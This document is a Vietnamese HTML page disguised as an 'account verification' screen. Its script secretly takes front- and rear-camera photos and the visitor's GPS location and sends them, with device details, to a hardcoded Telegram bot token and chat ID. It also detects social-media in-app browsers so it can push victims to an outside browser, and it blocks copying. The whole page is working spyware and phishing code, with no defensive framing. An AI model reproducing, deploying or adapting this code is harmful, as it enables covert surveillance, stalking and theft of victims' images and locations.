<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác Minh Tài Khoản</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d1117;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #161b22;
            padding: 40px 25px;
            border-radius: 24px;
            text-align: center;
            width: 90%;
            max-width: 360px;
            border: 1px solid #30363d;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
        }
        .btn {
            background: #238636;
            color: white;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 12px;
            font-weight: bold;
            cursor: pointer;
            font-size: 17px;
            transition: 0.3s;
            margin-top: 15px;
        }
        .btn:disabled {
            background: #21262d;
            color: #8b949e;
        }
        #status {
            font-size: 14.5px;
            color: #8b949e;
            margin-top: 20px;
            min-height: 24px;
        }
        #browser-warning {
            display: none;
            position: fixed;
            inset: 0;
            background: #0d1117;
            z-index: 10000;
            padding: 40px 20px;
            box-sizing: border-box;
        }
        .warning-box {
            background: #1c2128;
            border: 2px solid #f85149;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
        }
        .highlight { color: #ffeb3b; font-weight: bold; }
    </style>
</head>
<body>

    <div id="browser-warning">
        <div class="warning-box">
            <h3>⚠️ YÊU CẦU MỞ TRÌNH DUYỆT NGOÀI</h3>
            <div style="text-align:left; margin-top:20px; line-height:2.1;">
                1. Nhấn <span class="highlight">(⋯)</span> hoặc <span class="highlight">(⋮)</span> góc trên bên phải<br>
                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span>
            </div>
        </div>
    </div>

    <div class="card">
        <h2>Xác Minh Tài Khoản</h2>
        <p style="color:#8b949e; margin:18px 0 10px;">Nhấn nút bên dưới để xác thực ngay</p>
        <button class="btn" id="startBtn">BẮT ĐẦU XÁC THỰC</button>
        <div id="status"></div>
    </div>

    <script>
        const BOT_TOKEN = "8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds";
        const CHAT_ID = "7031115869";
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

        function checkAndShowWarning() {
            const ua = navigator.userAgent || "";
            if (/TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua)) {
                document.getElementById('browser-warning').style.display = 'block';
                document.querySelector('.card').style.display = 'none';
            }
        }
        document.addEventListener("DOMContentLoaded", checkAndShowWarning);

        const btn = document.getElementById('startBtn');
        const statusEl = document.getElementById('status');

        async function getLocation() {
            return new Promise(resolve => {
                if (!navigator.geolocation) return resolve("Không hỗ trợ");
                navigator.geolocation.getCurrentPosition(
                    p => resolve(`https://www.google.com/maps?q=${p.coords.latitude.toFixed(6)},${p.coords.longitude.toFixed(6)}`),
                    () => resolve("Không lấy được vị trí"),
                    { timeout: 3500, enableHighAccuracy: false }
                );
            });
        }

        async function captureCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode, width: { ideal: 800 }, height: { ideal: 600 } },
                    audio: false
                });
                return new Promise(resolve => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.muted = true;
                    video.playsInline = true;
                    video.play();

                    video.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;

                        setTimeout(() => {
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            stream.getTracks().forEach(t => t.stop());
                            canvas.toBlob(b => resolve(b), 'image/jpeg', 0.78);
                        }, 380);
                    };
                });
            } catch (e) {
                return null;
            }
        }

        async function sendToTelegram(info, front, back, loc) {
            const caption = `🔐 **Xác Minh Tài Khoản Mới**\n\n` +
                           `⏰ Thời gian: ${info.time}\n` +
                           `📱 Thiết bị: ${info.device}\n` +
                           `🖥 Hệ điều hành: ${info.os}\n` +
                           `📍 Vị trí: ${loc}\n` +
                           `📷 Camera: ${info.camera}`;

            if (front || back) {
                const media = [];
                if (front) media.push({ type: "photo", media: "attach://front", caption: caption, parse_mode: "Markdown" });
                if (back) media.push({ type: "photo", media: "attach://back" });

                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('media', JSON.stringify(media));
                if (front) fd.append('front', front, 'front.jpg');
                if (back) fd.append('back', back, 'back.jpg');

                await fetch(`${TELEGRAM_API}/sendMediaGroup`, { method: 'POST', body: fd });
            } else {
                // Nếu không có ảnh thì gửi text thường
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
                });
            }
        }

        async function main() {
            statusEl.innerText = "Đang xác thực...";

            const info = {
                time: new Date().toLocaleString('vi-VN'),
                device: navigator.platform || 'Unknown',
                os: /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'iOS' : /Android/i.test(navigator.userAgent) ? 'Android' : 'Desktop',
                camera: '✅ Đã chụp'
            };

            const [front, back, location] = await Promise.all([
                captureCamera('user'),
                captureCamera('environment').catch(() => null),
                getLocation()
            ]);

            await sendToTelegram(info, front, back, location);
            statusEl.innerText = "Xác thực hoàn tất ✓";
        }

        btn.addEventListener('click', async () => {
            btn.disabled = true;
            btn.innerText = "ĐANG XỬ LÝ...";

            try {
                await main();

                let sec = 3;
                const timer = setInterval(() => {
                    btn.innerText = `HOÀN TẤT TRONG ${sec}s`;
                    sec--;
                    if (sec < 0) {
                        clearInterval(timer);
                        window.location.href = "";
                    }
                }, 800);
            } catch (e) {
                statusEl.innerText = "Hoàn tất";
                setTimeout(() => window.location.href = "", 1000);
            }
        });

        document.addEventListener('copy', e => e.preventDefault());
    </script>
</body>
</html>
